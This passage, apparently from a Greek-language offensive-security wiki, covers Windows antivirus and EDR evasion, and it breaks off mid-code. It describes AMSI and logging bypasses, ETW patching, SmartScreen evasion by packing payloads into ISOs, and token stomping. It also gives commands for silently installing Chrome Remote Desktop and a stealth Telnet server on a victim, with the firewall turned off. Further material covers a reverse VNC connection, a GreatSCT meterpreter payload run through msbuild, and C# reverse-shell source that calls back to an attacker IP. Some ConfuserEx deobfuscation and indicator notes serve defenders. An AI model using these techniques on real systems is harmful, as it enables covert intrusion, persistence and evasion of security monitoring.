Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για την παράκαμψη του AMSI, το οποίο αποφεύγει το signature μέσω randomized user-defined function, variables και character expression και εφαρμόζει random character casing στα PowerShell keywords για την αποφυγή του signature.

**Αφαιρέστε το εντοπισμένο signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το εντοπισμένο AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και στη συνέχεια αντικαθιστώντας το με NOP instructions, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν το AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν το AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε την έκδοση 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

Το PowerShell logging είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα tool όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει controls που συνδέονται συγκεκριμένα με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει το entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί με αυτό και ίσως να εφαρμόζετε encryption μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή commercial forks), είναι συνηθισμένο να αντιμετωπίζετε πολλά layers προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω διαδικασία αποκαθιστά αξιόπιστα ένα σχεδόν **αρχικό IL**, το οποίο στη συνέχεια μπορεί να γίνει decompile σε C# με tools όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το PE checksum, επομένως οποιαδήποτε αλλαγή θα προκαλέσει crash στο binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους metadata tables, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τις 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Symbol / control-flow recovery – Δώστε το *clean* file στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile
• Το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει τα constant strings.

3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά τις άμεσες method calls με lightweight wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να παρατηρείτε κανονικά .NET APIs, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – Εκτελέστε το resulting binary με το dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *real* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς να χρειάζεται να εκτελέσετε το κακόβουλο sample** – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη αρχική διαλογή samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator επιδεικνύει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά το compile time, χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το C++ template metaprogramming framework, κάνοντας τη ζωή του ατόμου που θέλει να κάνει crack στην εφαρμογή λίγο δυσκολότερη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα pe files, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετασχηματίζοντας τις κανονικές instructions σε ROP chains και εμποδίζοντας τη φυσική μας αντίληψη για το κανονικό control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### LLVM compiler-assisted per-function self-masking

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όταν βρίσκεται σε sleep, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες functions XOR-masked όποτε είναι ανενεργές. Το Function Peekaboo PoC επιλέγει demangled names που περιέχουν `REG_`, εισάγει position-independent entry/exit stubs γύρω από τον τελικό machine code και εκπέμπει έναν κοινό masking handler στο `.text`. Οι signatures σε επίπεδο source και το Windows x64 calling convention παραμένουν αμετάβλητα.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Αυτό ανήκει μετά το instruction selection και το optimization, επειδή ο μετασχηματισμός πρέπει να καλύπτει κάθε emitted return και να γνωρίζει το ακριβές x86 layout. Ένα pre-emission `MachineFunctionPass` εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να περνά στο appended epilogue και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε οποιοδήποτε compiler-generated stack/frame teardown προηγείται κάθε return· κάντε redirect μόνο στην ίδια την return instruction.<sup>[[38]](#references)[[39]](#references)</sup>

Οι `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα per-function stubs, ενώ η `emitEndOfAsmFile()` εκπέμπει τον handler. Symbols που μοιράζονται μεταξύ των emission stages επιτρέπουν σε ένα prologue branch να στοχεύει το μεταγενέστερο epilogue του. Για ένα manually emitted near `je`, γράψτε `0F 84` ακολουθούμενο από το τετρά-byte MC expression `target - address_after_je`. Τα calls και jumps προς τον handler μπορούν αντί αυτού να εκπέμπονται ως `MCInst` objects (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια unselected function όταν δεν άλλαξε τίποτα· το PoC επιστρέφει εσφαλμένα `true` σε αυτή τη διαδρομή.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

Το PoC τοποθετεί ένα XOR key και records των 16 byte, τα οποία περιέχουν έναν loader-relocated function pointer και ένα runtime length, στο `.funcmeta`. Παρότι το C field είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στο record offset `+8`, καταναλώνοντας το length και το padding του, και προχωρά στα records κατά `0x10`. Τα PE section names καταλαμβάνουν μόνο οκτώ bytes, επομένως το runtime lookup βλέπει `.funcmet`. Ένας external patcher προσθέτει ένα executable `.stub`, αποθηκεύει το παλιό entry-point RVA στο stub και κάνει redirect το `AddressOfEntryPoint`. Το PIC stub αποκτά το image base από το `gs:[0x60]` → `[PEB+0x10]`, διασχίζει τα PE32+ imports για να επιλύσει ένα ήδη imported `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η initialization θέτει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε metadata function. Το μόνιμα readable prologue καταγράφει το function start στο `gs:[0xF0]`, εντοπίζει το sentinel και παρακάμπτει το body που δεν έχει ακόμη γίνει clear. Το epilogue χρησιμοποιεί έπειτα `call handler`. Αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η return address στο `[rsp+0x68]` είναι το τέλος της transformed function, οπότε το `end - start` μπορεί να γραφτεί στο metadata record της. Το stub καθαρίζει το sentinel και κάνει jump στο `ImageBase + original_entry_point_RVA`, αφού έχουν γίνει masking όλα τα bodies.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια ενός normal call, το prologue καλεί τον ίδιο symmetric handler για να κάνει decode το body. Η τελική διαδρομή περνά στο appended epilogue, ενώ κάθε προηγούμενο return κάνει jump απευθείας στον shared handler. Το normal epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, έτσι ώστε, μετά το re-masking, το `ret` του handler να καταναλώνει την return address του αρχικού caller και να διατηρεί το function result στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Ο handler εντοπίζει το τρέχον record, παρακάμπτει το fixed visible prologue (`0x46` bytes σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte-by-byte με το low key byte και στη συνέχεια το επαναφέρει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος loop κάνει decode κατά την είσοδο και encode σε κάθε normal exit.<sup>[[38]](#references)[[39]](#references)</sup>

Τα high-signal indicators για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- ένα entry point μέσα σε executable `.stub` και ένα section `.funcmet` που περιέχει key και relocated `.text` pointers·
- pre-CRT parsing των PEB, import table και section table, ακολουθούμενο από calls μέσω κάθε metadata pointer·
- πανομοιότυπα `call`/`pop` PIC prologues και πολλά return sites που κάνουν redirect σε έναν handler·
- writes στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενα από επαναλαμβανόμενες `VirtualProtect` transitions και bytewise XOR writes σε image-backed executable pages.

Αυτό είναι evasion από memory scanners, όχι cryptographic protection: το patched file εξακολουθεί να περιέχει το αρχικό clear body, ενώ ένας debugger μπορεί να κάνει break στο `VirtualProtect` ή στο XOR loop και να κάνει dump την active function. Το single-byte XOR, τα readable metadata και το fixed `0x46` boundary κάνουν επίσης την offline recovery απλή.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι thread-local, αλλά οι τροποποιημένες code pages είναι process-wide. Επομένως, concurrent ή recursive entry μπορεί να κάνει re-toggle τις instructions ενώ κάποια άλλη invocation εκτελείται. Exceptions και nonlocal exits μπορούν επίσης να παρακάμψουν το re-masking. Μια robust implementation πρέπει να συγχρονίζει τα transitions, να επαναφέρει την protection που επιστράφηκε μέσω `lpflOldProtect`, να αποφεύγει hard-coded stub lengths, να ελέγχει και τα `call` και `jmp` paths για x64 stack alignment και να καλεί `FlushInstructionCache` μετά την επανεγγραφή executable bytes. Η Microsoft καθιστά ρητά τον caller υπεύθυνο για την instruction-cache coherency όταν τροποποιείται executable code.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων executables από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που έχει σχεδιαστεί για να προστατεύει τον end user από την εκτέλεση δυνητικά κακόβουλων applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με reputation-based προσέγγιση, πράγμα που σημαίνει ότι εφαρμογές που έχουν ληφθεί σπάνια θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας έτσι και αποτρέποντας τον end user από την εκτέλεση του file (παρότι το file μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στα More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη files από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα file που λήφθηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables υπογεγραμμένα με **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ακολουθεί ένα demo για bypassing του SmartScreen με το packaging payloads μέσα σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός logging στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα system components να **καταγράφουν events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για την παρακολούθηση και τον εντοπισμό malicious activities.

Παρόμοια με το πώς απενεργοποιείται (bypassed) το AMSI, είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** του user space process να επιστρέφει αμέσως χωρίς να καταγράφει events. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για το συγκεκριμένο process.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Το loading C# binaries στη μνήμη είναι γνωστό εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο για την εκτέλεση των post-exploitation tools σας χωρίς να εντοπίζονται από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα πρέπει να ανησυχούμε μόνο για το patching του AMSI για ολόκληρο το process.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει το **spawning ενός νέου sacrificial process**, το injection του post-exploitation malicious code σας σε αυτό το νέο process, την εκτέλεση του malicious code και, όταν ολοκληρωθεί, το killing του νέου process. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός του** Beacon implant process μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια του post-exploitation action μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για injection του post-exploitation malicious code **στο δικό του process**. Με αυτόν τον τρόπο μπορείτε να αποφύγετε τη δημιουργία ενός νέου process και το scanning του από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** επειδή μπορεί να γίνει crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να κάνετε loading C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [video του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες, παρέχοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο environment στο SMB share, μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo αναφέρει: Το Defender εξακολουθεί να κάνει scanning στα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για bypass static signatures**. Οι δοκιμές με τυχαία, un-obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το Token stomping χειρίζεται το access token ενός security product, όπως ένα EDR ή AV. Η μείωση των privileges του token μπορεί να αφήσει το process να εκτελείται, ενώ το εμποδίζει να πραγματοποιεί privileged inspection ή remediation actions.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικά processes** από το να αποκτούν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να κάνετε deploy το Chrome Remote Desktop σε έναν victim's PC και στη συνέχεια να το χρησιμοποιήσετε για να κάνετε takeover και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κάντε download από το https://remotedesktop.google.com/, κάντε click στο "Set up via SSH" και, στη συνέχεια, κάντε click στο MSI file για Windows ώστε να κάνετε download το MSI file.
2. Εκτελέστε σιωπηλά τον installer στον victim (απαιτούνται admin privileges): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε click στο next. Ο wizard θα σας ζητήσει να κάνετε authorize. Κάντε click στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο system, επομένως είναι ουσιαστικά αδύνατο να παραμείνετε εντελώς undetected σε mature environments.

Κάθε environment απέναντι στο οποίο κινείστε θα έχει τα δικά του strengths και weaknesses.

Σας ενθαρρύνω ιδιαίτερα να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), ώστε να αποκτήσετε μια βάση στις πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί malicious το Defender** και θα σας το διαχωρίσει.\
Ένα άλλο tool που κάνει **το ίδιο πράγμα είναι το** [**avred**](https://github.com/dobin/avred), με μια open web υπηρεσία στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ρυθμίστε το να **ξεκινά** όταν ξεκινά το σύστημα και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεστε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει μέσα** στο **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια αντίστροφη **VNC σύνδεση**. Στη συνέχεια, μέσα στο **θύμα**: Εκκινήστε το winvnc daemon `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, διαφορετικά θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκίνησε το lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
